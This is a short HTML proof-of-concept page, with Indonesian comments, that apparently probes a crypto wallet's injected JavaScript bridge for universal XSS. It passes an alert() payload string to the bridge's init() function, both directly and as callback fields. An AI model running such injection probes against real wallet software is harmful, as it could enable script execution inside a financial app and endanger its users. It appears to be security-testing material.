<!DOCTYPE html>
<html>
<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
    <h3>☣️ 1inch Bridge Overwrite Test</h3>
    <div id="logs"></div>

    <script>
        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
        const Bridge = window.OneInchSolanaWallet;

        if (Bridge) {
            log("Mencoba Overwrite via init()...");

            try {
                // Skenario: Mengirim kode JS langsung ke dalam fungsi init
                // Kita coba pancing agar dompet menjalankan eval pada parameter yang kita kirim
                const payload = "alert('UXSS via Init Successful!')";
                
                // Percobaan 1: Kirim string langsung
                Bridge.init(payload);
                
                // Percobaan 2: Kirim sebagai objek callback (format umum DApp)
                Bridge.init({ 
                    onSuccess: payload, 
                    onEvent: payload 
                });

                log("Payload dikirim. Tunggu 5 detik...");
            } catch(e) {
                log("Error: " + e.message);
            }
        } else {
            log("Bridge tidak ditemukan.");
        }
    </script>
</body>
</html>
